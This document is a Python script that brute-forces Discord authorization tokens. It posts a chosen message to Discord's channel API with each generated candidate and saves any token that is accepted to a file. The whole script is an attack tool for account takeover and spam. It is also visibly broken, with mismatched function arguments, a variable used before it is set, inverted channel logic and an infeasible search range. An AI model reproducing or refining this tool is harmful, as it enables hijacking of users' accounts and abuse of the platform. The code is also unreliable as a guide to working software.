import requests

from itertools import chain, product
from random import sample
from string import ascii_letters, digits, punctuation, whitespace
import psutil
import os

########################## CONFIG

message = "Hello World!"

savetokens = True # If it finds a token, then saves it

dont_limit_cpu = False # MAY CRASH YOUR COMPUTER IF YOU SET THIS TO TRUE

specificchannel = False # Set to true if you want to specify a channel id
channel_id = None # If specificchannel is true, this is the channel id. Leave to None if you don't want it

##########################

def request(token, message, specificchannel, savetokens):
    if specificchannel == None:
        url = f"https://discord.com/api/channels/{channel_id}/messages"
        savetoken = False
        for i in range(100000000000000000,99999999999999999999):
            channel_id = i

            headers = {"Authorization": token}
            payload = {"content": message}

            response = requests.post(url, headers=headers, json=payload)
            if response.status_code == 200 and savetokens == True:
                savetoken = True
        if savetoken == True:
            with open("tokens.txt", "a") as f:
                f.write(f"{token}\n")
            print(f"Found a token: {token}")
        return response.status_code
    else:
        url = f"https://discord.com/api/channels/{channel_id}/messages"
        savetoken = False

        channel_id = specificchannel

        headers = {"Authorization": token}
        payload = {"content": message}

        response = requests.post(url, headers=headers, json=payload)

        if response.status_code == 200 and savetokens == True:
            with open("tokens.txt", "a") as f:
                f.write(f"{token}\n")

        return response.status_code

def limit_cpu():
    "is called at every process start"
    p = psutil.Process(os.getpid())
    # set to lowest priority, this is windows only, on Unix use ps.nice(19)
    p.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)

def brute(start_length=1, length=20, ramp=True, letters=True, numbers=True, symbols=False, spaces=False):
    choices = ''
    choices += ascii_letters if letters else ''
    choices += digits if numbers else ''
    choices += punctuation if symbols else ''
    choices += whitespace if spaces else ''
    choices = ''.join(sample(choices, len(choices)))

    if ramp:
        if start_length < 1 or start_length > length:
            start_length = 1

    return (
        ''.join(candidate) for candidate in
        chain.from_iterable(product(choices, repeat=i) for i in range(start_length if ramp else length, length+1))
    )

if dont_limit_cpu == False:
    limit_cpu()

for token in brute(67, 75, True, True, True, True, False): #Generally the token is around 70 characters long
    status = request(token, message)

print("EVERYTHING IS DONE")
